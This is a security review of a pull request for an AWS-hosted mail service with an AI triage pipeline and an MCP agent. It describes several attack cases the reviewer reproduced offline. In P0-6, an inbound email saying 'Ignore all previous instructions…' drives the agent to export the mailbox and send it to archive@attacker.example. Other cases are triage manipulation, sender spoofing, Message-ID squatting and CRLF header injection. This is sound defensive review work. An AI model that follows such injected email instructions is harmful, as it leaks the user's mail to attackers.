# lojo-mail independent review: PR #1 (`cursor/lojo-mail-service-4767` @ `c59d230`)

**Verdict: NOT READY for first deploy.**

The design is careful and the documentation is unusually honest. But six defects would each stop the first deploy from working, or break the core safety promise. A first `terraform apply` with the documented steps would produce:

- Lambdas that crash on load.
- A processor that cannot read what SES writes, and that has no IAM permission for the DynamoDB calls it makes.
- An API that cannot send mail.
- An MCP send path that an inbound email can drive.

Every item below has a file reference and a repro that runs offline.

Reviewer constraints I followed: I changed no application or infrastructure code, deployed nothing, and touched no cloud resources. All AWS behavior was checked with mocks, and Terraform ran against `mock_provider` only.

---

## 1. What was run

| Check | Result | Evidence |
| --- | --- | --- |
| `npm ci` | ok, 0 vulnerabilities | `qa/evidence/` |
| `npm run typecheck` | pass | `qa/evidence/typecheck.log` |
| `npm run lint` | pass | `qa/evidence/lint.log` |
| `npm test` | 37/37 pass | `qa/evidence/test.log` |
| `npm run secrets:check` | pass | `qa/evidence/secrets.log` |
| `npm run infra:validate` (TF 1.9.8, AWS provider 5.100.0) | `validate` + `fmt -check` pass | `qa/evidence/tf-validate.log` |
| Offline `terraform plan` (mocked providers, 12 runs) | 5 pass, 7 fail (findings) | `qa/terraform/offline_plan.tftest.hcl`, `qa/terraform/offline_plan.result.txt` |
| `npm run build:lambda`, then `require()` each bundle | **both bundles throw at load** | `qa/evidence/lambda-bundle-load.txt` |
| Security harness (22 cases, 6 malicious emails) | 5 controls pass, 17 findings reproduced | `qa/harness/security.test.ts`, `qa/evidence/security-harness.txt` |
| Importer harness (15 cases, synthetic Tuta export incl. 20 MB attachment) | 8 pass, 7 findings | `qa/harness/importer.test.ts`, `qa/evidence/importer-harness.txt` |
| `npm run dev` + browser walkthrough, desktop 1440×900 and phone 390×844 | works locally, UX bugs noted | `qa/screenshots/` |
| Dev server exposure | listens on all interfaces; dev tokens accepted with `NODE_ENV=production` | `qa/evidence/dev-server-exposure.txt` |

The existing 37 tests all pass, but none exercise the deployed shape: a locked API, real DynamoDB limits, the bundled Lambda, or the SES S3 action. Every P0 below lives in that gap.

Re-run everything:

```bash
npm ci
node --import tsx --test qa/harness/security.test.ts   # failures = findings
node --import tsx --test qa/harness/importer.test.ts
# Terraform (offline). Terraform insists tests live inside the module, so copy it:
terraform -chdir=infra/terraform init -backend=false
mkdir -p /tmp/tfqa/tests && cp infra/terraform/*.tf infra/terraform/.terraform.lock.hcl /tmp/tfqa/ \
  && cp -r infra/terraform/placeholders /tmp/tfqa/ && ln -s "$PWD/infra/terraform/.terraform" /tmp/tfqa/.terraform \
  && cp qa/terraform/*.tftest.hcl /tmp/tfqa/tests/ && terraform -chdir=/tmp/tfqa test
```

The harnesses are intentionally **not** wired into `npm test` (`scripts/run-tests.mjs` only walks `packages/` and `scripts/`). They assert the promised behavior, so they fail today and should turn green as fixes land. When a fix lands, move the matching case into the package's own tests.

---

## 2. Punch list

### P0: blockers for the first deploy

**P0-1. Both Lambda bundles crash on module load.**
Files: `packages/pipeline/package.json`, `packages/api/package.json` (esbuild `--format=cjs`), `packages/core/src/openpgp/mail.ts` (imports `openpgp`).
Repro:

```bash
npm run build:lambda
node -e "require('./packages/pipeline/dist/processor.cjs')"
# TypeError [ERR_INVALID_ARG_VALUE]: The argument 'filename' must be ... Received undefined
#   at processor.cjs:113656  nodeRequire: (0, import_module.createRequire)(import_meta.url)
```

The same error occurs for `packages/api/dist/api.cjs`. openpgp's Node build calls `createRequire(import.meta.url)`, and esbuild's CJS output replaces `import.meta` with `{}`. Every invocation of both functions would fail at init. Fix options: build ESM (`--format=esm`, `.mjs`, handler `processor.handler`), or add `--define:import.meta.url=...` with a banner shim, or lazy-import openpgp only on the send path. Also add a CI step that `require`s or `import`s the built bundles.

**P0-2. Neither Lambda role can run the DynamoDB calls the code makes.**
Files: `infra/terraform/iam.tf` (statements `IndexTables`: Get/Put/Update/Query/DeleteItem only), `packages/core/src/store/dynamo.ts` (`getMessageByRfcId`, `listMessages` without folder, `listThreads`, `listDrafts`, `listAudit`, `listContacts` all call `scan`).
Repro: `terraform test` runs `processor_role_can_scan_the_tables_it_scans` and `api_role_can_scan_the_tables_it_scans` (both fail). Every inbound message calls `ingestRaw` → `getMessageByRfcId` → `ScanCommand`, which gets `AccessDenied`, so no message is ever indexed. The API's thread view, search, drafts, export, and audit pages fail the same way.

**P0-3. The processor reads SES output as ciphertext.**
Files: `infra/terraform/ses.tf` (`s3_action.kms_key_arn = aws_kms_key.mail.arn`), `packages/pipeline/src/handler.ts` (plain `GetObjectCommand`).
When a receipt rule's S3 action names a KMS key, SES encrypts the object client-side with the Amazon S3 encryption client before upload. The data key is wrapped by KMS and stored in object metadata, and the reader must use the S3 encryption client to decrypt. The processor uses plain `GetObject` and passes the encrypted envelope to `simpleParser`. The result is a junk "message" from `unknown@invalid` or a parse failure. Repro: `terraform test` → `receipt_rule_relies_on_bucket_sse_kms_not_ses_client_side_encryption`. Fix: remove `kms_key_arn` from the S3 action. The bucket's default SSE-KMS with bucket keys already encrypts `raw/*` at rest, and plain `GetObject` then works. This also makes the SES `kms:Decrypt/ReEncrypt*` grant in `kms.tf` unnecessary.

**P0-4. The sealed body, including attachments, is stored inline in the DynamoDB item.**
Files: `packages/core/src/ingest.ts` (lines 171–206: `envelope` on the `StoredMessage`), `packages/core/src/store/dynamo.ts` (`putMessage`). The docs say otherwise: `docs/ARCHITECTURE.md` "objects/{id}.bin — application-layer envelope", SECURITY.md, and `iam.tf` all grant `s3:PutObject objects/*`, which no code uses.
DynamoDB rejects items over 400 KB. Attachments are base64'd into the JSON, and the ciphertext is base64'd again, so the item is about 1.8× the attachment size.
Repro: `security.test.ts` → a 300 KB PDF produces a **534 KB** item. `importer.test.ts` → a 20 MB attachment produces a **35.6 MB** item. On AWS the processor throws after sealing. With no DLQ (P1-6), the message never reaches the index, though raw MIME stays in `raw/`. Fix: write the envelope to `s3://…/objects/{id}.bin` as documented, and keep only the object key in DynamoDB.

**P0-5. The deployed API cannot send mail, draft replies, or rewrite.**
Files: `packages/core/src/mailbox.ts` (`approveAndSend` → `readDraft` → `requireKey()`, `draftReply` → `openMessage`, `rewrite` → `readDraft`), `packages/api/src/lambda.ts` (no private key, by design), `packages/api/src/app.ts` (`/v1/session/unlock` refused when `dev=false`).
Repro: `security.test.ts` → `[P0] production API (no private key) cannot approve-and-send any draft` returns `423 {"error":"Mailbox is locked"}`. "Draft reply" in the web app hits `POST /v1/messages/:id/draft-reply`, which 423s the same way. The architecture needs the draft plaintext to reach the sender without the server holding the envelope key. For example, the browser posts the approved plaintext, or drafts are sealed to a separate server-held send key. Right now the "approve and send" path works only in local dev.

**P0-6. An inbound email can drive a send-scoped MCP agent to exfiltrate mail.**
Files: `packages/mcp/src/tools.ts` (`create_draft` accepts any recipient; `approve_and_send` needs only the `send` scope; description "The model cannot call this on its own" is not enforced), `packages/mcp/src/server.ts`, `packages/api/src/auth.ts` (dev token `dev-only-change-me` = read, write, send, admin).
Repro: `security.test.ts` → `[P0] MCP: an email can drive a send-scoped agent…` with `qa/fixtures/malicious/01-agent-exfil.eml`. Tool output hands the attacker's "Ignore all previous instructions…" text to the model verbatim. `export_mailbox` → `create_draft(to: archive@attacker.example)` → `approve_and_send` then delivers the full export, including the sealed body `CODEWORD-ZEBRA`, to the attacker. Nothing server-side distinguishes a human approval from a model tool call.

- **Today:** exploitable wherever the API is unlocked, which is the documented local setup (`npm run dev` holds the key and the dev token has `send`).
- **In production:** exploitable as soon as P0-5 is fixed.

The brief's requirement ("AI can never send without explicit approval; an inbound email must not be able to trigger sends … or data exfiltration") is therefore not met by the code. It depends on the MCP client's tool-confirmation UI.

Fix, at minimum:

- Do not register `approve_and_send` in the MCP server at all, or require an out-of-band human confirmation (one-time code shown in the PWA, or approval only from the web session).
- Restrict MCP-created drafts to existing thread participants unless a human edits them.
- Wrap email-derived tool output in explicit untrusted-content delimiters.

### P1: fix before trusting it with real mail

**P1-1. The dev API is network-exposed and the documented production refusal is false.**
`packages/api/src/server.ts` calls `serve({ fetch, port })` with no hostname and listens on `::` (all interfaces), while it logs `http://127.0.0.1`. It also calls `tokenBookFromEnv(process.env, false)`, which hard-codes `production=false`. Repro (`qa/evidence/dev-server-exposure.txt`):

- `curl http://<LAN-IP>:8787/v1/settings -H 'authorization: Bearer dev-only-change-me'` returns `unlocked:true`.
- With `NODE_ENV=production`, `dev-send-change-me` is still accepted.

`server.ts`, the Settings page, and the README all say it is refused. On any shared network, anyone can read and send from the unlocked demo mailbox, and from a real one if Jon points dev at real data or a real LLM key. Fix: bind `127.0.0.1` and honor `NODE_ENV`.

**P1-2. A forged `From: lojo@cyberphysical.us` is filed as Sent and marked read.**
`packages/core/src/ingest.ts` line 183 (`fromSelf`). The processor ignores the SES verdict headers (`X-SES-Spam-Verdict`, `X-SES-Virus-Verdict`, SPF/DKIM/DMARC). `scan_enabled = true` in `ses.tf` only adds headers, so virus-flagged mail is also delivered normally. Repro: `security.test.ts` with `03-spoofed-self.eml`. An attacker can plant fake "sent" mail and hide it from the inbox. Fix: decide `sent` from the send path (API), never from inbound headers. Surface the verdicts, and quarantine on `FAIL`.

**P1-3. The dedupe key is attacker-controlled (Message-ID squatting).**
`ingest.ts` lines 81–91. A message that reuses a future legitimate Message-ID causes the real message to be discarded as a duplicate. Repro: `04-message-id-squat.eml` then `fixtures/emails/personal.eml` gives `duplicate: true`. Fix: key inbound dedupe on the SES object key or message ID (unique per delivery), and use Message-ID only for threading.

**P1-4. Dedupe, threading, inbox, and search read a single Scan page.**
`store/dynamo.ts` (`scan(table, 500)` with no pagination, `listMessages` without folder, `refreshThread`/`readThread`/`search` filter one page). Repro: `security.test.ts` → a redelivered message #501 is stored twice. With inline envelopes (P0-4), a 1 MB page holds far fewer than 500 items, so this bites within days. Fix: add a GSI on `rfcMessageId` (and use the `thread` GSI that already exists for thread reads), and paginate.

**P1-5. The OpenPGP claims do not match the code.**
`core/src/mailbox.ts` lines 373–380, `core/src/openpgp/mail.ts`. SECURITY.md says outbound mail is encrypted, "and, when he has unlocked a signing key, signs". The code encrypts only to `to[0]`'s key and sends that ciphertext to every recipient, so Cc and other To recipients cannot read it. It never signs, and does not encrypt to Jon's own key, so his stored sent copy is armor he cannot open. Repro: `security.test.ts` → `[P1] OpenPGP send…`. Inbound detection also treats `application/pgp-signature` (signed, not encrypted) and any attachment with "pgp" in its name as encrypted, which silently skips AI. Fix the code or the doc.

**P1-6. There is no failure path for the processor.**
`infra/terraform/lambda.tf` configures no DLQ or on-failure destination, no alarm, and no reserved concurrency. After two async retries, an S3 event is dropped silently. There is also no redrive tool: raw MIME is kept, but nothing re-invokes the processor. Repro: `terraform test` → `processor_has_failure_destination_or_dlq`.

**P1-7. The Lambda runtime is `nodejs20.x`.**
`infra/terraform/lambda.tf`, `.nvmrc`, CI. Node 20 reached upstream end-of-life on 2026-04-30, and Lambda's deprecation schedule follows it. Check the Lambda runtimes page before apply. If function creation is already blocked, this is a P0. Move to `nodejs22.x` (and `--target=node22`).

**P1-8. The production PWA cannot reach the API.**
`packages/web/src/api.ts` uses relative `fetch(path)` and there is no API base URL setting. The architecture has the PWA "on an existing HTTPS origin" and the API on API Gateway, so every request goes to the wrong host. `getToken()` also silently falls back to `dev-only-change-me`.

**P1-9. The importer has no path into AWS, and it corrupts 8-bit bodies.**
`packages/importer/src/cli.ts` always uses `MemoryStore` plus a JSON file. `LOJO_STORE=dynamo` (MIGRATION.md) is not implemented anywhere, and `npm run dev` does not load `data/mailbox.json` either (MIGRATION.md says it does). Separately, `import-mailbox.ts` line 51 reads each file with `readFileSync(file, "utf8")`, so Latin-1 and other 8-bit bodies become `Le cafï¿½ est prï¿½t`. Repro: `importer.test.ts` (P1 cases). Fix: read `Buffer`, and implement the DynamoDB target (with P0-4 fixed first, or the 20 MB message fails there).

**P1-10. Prompt injection can reshape triage, and write-scoped agents can trash mail.**
`ai/pipeline.ts` takes the model's `priority`, `category`, and `labels` as-is. `02-triage-manipulation.eml`, with a model that obeys it, lands at the top of triage as `now` with label `trusted`. The heuristic phishing floor does hold. Even with the stock mock, the phishing sample is the top triage item (`qa/screenshots/desktop-02-triage.png`). Separately, `move_message(folder: "trash")` needs only `write`. Repro: `security.test.ts` P1 cases. Fix: demote `phishingScore >= 40` out of `now`/`today`, whitelist AI labels, and gate trash behind confirmation or a separate scope.

**P1-11. SECURITY.md contradicts the code on the one account-wide switch.**
SECURITY.md › IAM says "Receipt rule set activation is a Terraform flag defaulting off". `variables.tf` defaults `manage_active_rule_set = true`, and so do README, RUNBOOK, and `terraform.tfvars.example`. The doc calls itself the contract. Pick one. Defaulting on is defensible, since the audit found no active set, but say so in SECURITY.md. Repro: `terraform test` → `security_md_says_active_rule_set_defaults_off`.

### P2: should fix

Infrastructure and Terraform:

- `ses_identity_mode = "create"` (the documented domain switch) **fails at plan**. The resource's `dkim_signing_attributes` contains the sensitive `domain_signing_private_key`, so `output "dkim_tokens"` (`outputs.tf`) errors with "Output refers to sensitive values". Repro: `terraform test` → last run. Fix: `sensitive = true` or `nonsensitive(...)` on the tokens.
- `terraform.tfvars.example` points `processor_bundle` at `dist/handler.cjs`, but the build writes `dist/processor.cjs`. RUNBOOK says "zips" but the variable expects the `.cjs`.
- Excess grants: `dynamodb:DeleteItem` on both roles and S3 `objects/*` put/get are never used (grep confirms no delete or `objects/` code). The processor also lacks `bedrock:InvokeModel`, so `llm_provider = "bedrock"` fails in Lambda. The Bedrock default model id (Claude 3 Haiku) may be legacy by now.
- `kms.tf` gives SES `Decrypt`/`ReEncrypt*` with no `kms:EncryptionContext` or `aws:SourceArn` condition. The bucket-policy SES statement has `SourceAccount` but no `SourceArn` for the rule.
- API Gateway has no stage throttling. DynamoDB tables have no `deletion_protection_enabled`.
- RUNBOOK says "The function reads SSM per request". `lambda.ts` caches the app, including tokens, per container, so rotation or revocation lags until cold start. If `/lojo-mail/api-token-send` is ever absent, `GetParameter` throws, `buildApp` rejects, and the rejected promise is cached, so every request fails until cold start.
- SES writes an `AMAZON_SES_SETUP_NOTIFICATION` object under `raw/` when the rule is created. It will be ingested as a message (harmless, surprising).
- DMARC aggregate reports to `dmarc@` go through the LLM pipeline, spending budget on XML zips.

Application:

- A decoded RFC 2047 subject can carry CR/LF into outbound raw headers. The PGP raw path in `api/src/ses.ts` and the local sent-copy in `mailbox.ts` lines 393–401 are both affected. Repro: `06-subject-crlf.eml` injects `Bcc:` and `X-Injected:` header lines. Strip CR/LF and RFC 2047-encode non-ASCII subjects.
- The Reply-To mismatch heuristic is dead code: `analyzeMessage` never passes `replyTo` to `heuristicPhishing`. Repro: `phish.eml`.
- Threads can be hijacked via `References` alone (`05-thread-hijack.eml` joins the lease thread). The attacker's message is then shown inside a trusted conversation, and prior subjects enter the model context.
- The envelope has no AAD binding to the message id, so a DynamoDB writer can swap bodies between rows undetected. AES-GCM tamper detection itself works.
- `approveAndSend` has no conditional write, so concurrent approvals can double-send. `addBudget` is read-modify-write, so the cap can overshoot. Both are code-read findings, not executed.
- API scope map: `POST /v1/search` needs `write`, so read-only tokens can't search (MCP calls `search_mail` a read tool). `POST …/summarize` needs only `read` but spends LLM tokens.
- No CSP in `packages/web/index.html`, even though the private key lives in page memory. Bodies render as text, which is the right call, so there's no HTML-email XSS surface today.
- The secret scanner (`scripts/check-no-secrets.mjs`) does not detect a private JWK (`"d":`), which is this system's most important secret.

Web UX, from the first-time-user walkthrough:

- "Draft reply" targets the thread's *latest* message. On a thread where Jon replied last, it drafts to `lojo@cyberphysical.us` (`desktop-05-compose-ai-draft.png`).
- Every visit to `#/compose?reply=` creates a new draft, so drafts pile up (`phone-07-drafts.png`).
- Ingest also creates a suggested reply-to-self for Jon's own sent copy.
- Draft rows show a duplicate "SUGGESTED" chip.
- The phone nav scrolls horizontally and hides "Write".
- Every list row renders as underlined link text.
- Settings says "Mailbox is unlocked in this API process" and "No private key is loaded" at the same time.
- Thread summaries show "Reply" twice.

Importer:

- An unescaped mbox body line starting with `From ` splits the message, and the trailing text is **silently dropped** (not reported in `errors`).
- `>From ` (mboxrd) escaping is not reversed.
- All history lands `unread`, which floods triage.
- A `--public-key` path that doesn't end in `public.jwk` gets the **private** key written into it.
- Whole files are read into one string, so very large mbox exports (hundreds of MB) will fail.
- MIGRATION.md's "subject + participants" threading fallback and "import ledger" check (`isImported` is never called) are not implemented. Idempotency relies on the Message-ID scan, which on DynamoDB inherits P1-4.

---

## 3. Threat model versus code (`docs/SECURITY.md`)

| Claim | Verdict |
| --- | --- |
| "Ordinary mail is not end-to-end"; OpenPGP is the only E2E path | **Accurate and clearly stated**, in SECURITY.md and in the app's Settings screen. This is the honesty the brief asked for. |
| Envelope `lojo-env-v1`: ephemeral P-256 ECDH, HKDF-SHA256, AES-256-GCM, random 12-byte IV | **Real and correct** (`core/src/crypto/envelope.ts`). Fresh ephemeral key per message, tamper detection works, body absent from the index (`CODEWORD-ZEBRA` test). Gaps: no AAD binding (P2); no forward secrecy, as the doc already says. |
| Envelope stored in S3 `objects/` | **False.** It's inline in DynamoDB (P0-4). |
| Private key never on the server in production | True for the Lambda path. The consequence is P0-5. |
| Inbound TLS required; outbound TLS REQUIRE; S3 TLS-only deny | **True** (`ses.tf`, `s3.tf`, mocked plan). |
| Block Public Access, BucketOwnerEnforced, versioning, SSE-KMS with bucket key, KMS rotation, DynamoDB SSE-KMS + PITR | **True** (mocked plan). |
| Processor role "`s3:GetObject raw/*`, no SES send"; API role "`ses:SendEmail` constrained by `ses:FromAddress`" | True, but **missing `dynamodb:Scan`** (P0-2) and with unused Delete/`objects/*` grants (P2). No `*` resources on data APIs. No IAM write. |
| "Receipt rule set activation … defaulting off" | **False** (P1-11). |
| Provider keys never in Terraform state | **True.** Grok key, tokens, and public key are SSM-only, and Terraform sets no secret value. |
| Audit row holds a SHA-256 of the prompt, not the prompt | **True**, including on model-output parse failures (harness control). |
| App does not log bodies | **True.** Only error messages and SSM parameter names are logged. |
| "Suggested replies are drafts. Sending requires `send` scope" | True, but **scope is not approval** (P0-6). |
| "Production boot refuses the well-known dev token values" | True for `lambda.ts`. **False for `server.ts`** (P1-1). |
| Inbound PGP is not sent to the LLM | True, and over-broad: signed-only mail and "pgp"-named attachments are also skipped (P1-5). |
| Outbound PGP encrypt-and-sign | **Partly false** (P1-5). |
| Phishing score advisory, never auto-deletes | True. The ingest path cannot send, delete, or retarget, even with a fully obedient model (harness control). |
| MCP scopes: read-only cannot approve or send | **True.** Path-variant fuzzing (`//`, `%2F`, `%61pprove`, trailing `/`, case, `..`) found no auth or scope bypass. |

## 4. Terraform review

- Offline plan (`qa/terraform/offline_plan.tftest.hcl`, mocked providers) with defaults:
  - Reads the existing SES identity and creates no identity or MAIL FROM.
  - Creates **zero Route 53 records**.
  - The receipt rule names only `lojo@` and `dmarc@`, with `tls_policy = Require` and scanning on.
  - The configuration set is TLS `REQUIRE`.
  - All four public-access blocks are on, and KMS rotation is on.
- **DNS guard rails hold:**
  - `manage_dns = true` in existing mode fails plan (`terraform_data.dns_guard` precondition).
  - Create mode also requires the exact confirmation string and an explicit `zone_id`.
  - No `aws_route53_record` sets `allow_overwrite`, so any pre-existing record makes apply fail rather than be replaced (grep: no matches in `infra/terraform`).
  - Existing mode writes none of the audited records: the ACM validation CNAME, the six DKIM CNAMEs, `_amazonses`, `mail.` MX/TXT, NS/SOA, apex SPF, and apex MX. All are listed under `dns_plan.leave_untouched` (asserted).
  - `scripts/dns-audit.mjs` against `fixtures/dns/example-zone.json` classifies all 18 records correctly and exits 0.
- Failures and gaps: P0-2, P0-3, P1-6, P1-7, P1-11, and the create-mode plan failure (P2).
- A real `terraform plan` needs credentials and was not run, per the brief. The mocked plan cannot catch provider-side validation. `terraform validate` passed.

## 5. Cost review (`docs/COSTS.md`)

The figures are plausible for about 400 messages in and 150 out per month. KMS at $1 per key-month is the floor.

- **Checks out:** SES inbound at $0.10 per 1,000 plus $0.09 per 1,000 chunks; HTTP API at $1 per million requests; KMS requests at $0.03 per 10,000; dedicated IP at about $24.95; and the cost of skipping Secrets Manager.
- **Couldn't verify:** the "Essentials plan since 21 July 2026" and "Pro $105" lines. Re-check them on the pricing page, as the doc itself says.
- **Grok range is conservative:** a `grok-3-mini`-class model at this volume, capped at 100k tokens per day, is more like $0.50–$2 per month than $4–12.

Two design issues change the cost shape, even though they are cheap at this volume:

- **Attachments stored in DynamoDB:** about 10× the S3 per-GB price, and fatal anyway above 400 KB (P0-4).
- **Scan-based access:** every inbound message triggers several full-page scans, roughly 128 read units each. That's still pennies here, but it's another reason to add GSIs.

The $1.50–$2.50 (Ollama) and "a few dollars" (Grok) totals are reasonable once P0-4 is fixed.

## 6. Migration importer (synthetic Tuta export)

The export tree has `Inbox/`, `Sent/`, `Archive/`, a custom `Projects/`, and an mbox. It contains:

- UTF-8 8-bit, Latin-1 8-bit, and ISO-2022-JP messages, with RFC 2047 subjects.
- One message without a Message-ID.
- One message exported into two folders.
- A threaded Sent reply.
- A 20 MB binary attachment.
- mbox From-line edge cases.

| Case | Result |
| --- | --- |
| First run | 10 imported, 1 skipped (cross-folder duplicate), 0 errors |
| Re-run (library and real CLI, two invocations on the same JSON store) | **Idempotent**: 0 new messages, threads, or contacts |
| UTF-8, ISO-2022-JP, RFC 2047 subjects | Correct |
| Latin-1 8-bit body | **Corrupted** (P1-9) |
| No Message-ID | Stable `generated.<sha256>` key; re-run skips it |
| 20 MB attachment | Byte-exact through the envelope (sha256 match), but a 35.6 MB item on DynamoDB (P0-4) |
| Folder mapping | Sent by From, custom folder becomes label plus archive, and the reply threads with its parent |
| mbox | Unescaped `From ` truncates text silently; `>From ` not unescaped (P2) |
| Path to AWS | None (P1-9) |

## 7. First-time user walkthrough (local dev, synthetic data)

Desktop screenshots (`qa/screenshots/`):

- `desktop-01-inbox.png` (inbox)
- `desktop-02-triage.png` (triage)
- `desktop-03-thread-ai-summary.png` (thread with AI summary)
- `desktop-04-thread-phishing.png` (phishing warning)
- `desktop-05-compose-ai-draft.png` (compose with AI draft)
- `desktop-06-compose-rewrite.png` (rewrite)
- `desktop-07-search-empty.png` and `desktop-08-search-results.png` (search)
- `desktop-09-settings.png` (settings)
- `desktop-10-drafts.png` (drafts)

Phone screenshots: `phone-01` through `phone-07` (same views, 390×844).

The app is quick and legible. The honest encryption note on Settings is good, and phone stacking works with no horizontal page scroll. The problems a new user hits first:

- The reply-to-self draft.
- Duplicate drafts on every "Draft reply" click.
- The phishing email at the top of triage as `now`.
- "Write" hidden off-screen in the phone nav.
- Confusing lock-state wording on Settings.

All of these are in P2 or P1-10.

## 8. What is solid

Keep these through the fixes:

- Text-only rendering of mail, so there's no HTML-email XSS against the in-browser key.
- The key is never sent to the API from the browser.
- The AI pipeline has no sender dependency.
- Draft recipients come from headers, not model output.
- The heuristic phishing floor survives a model that says 0.
- Scopes are enforced the same way in the API and MCP.
- DNS is read-only by default with layered guard rails.
- No secrets anywhere in the repo or Terraform.
- CI has no AWS credentials and never applies.
- The documentation is thorough and mostly candid.

The P0s are mostly integration gaps between well-built parts, not design flaws. P0-6 is the exception: approval needs a human-only path.
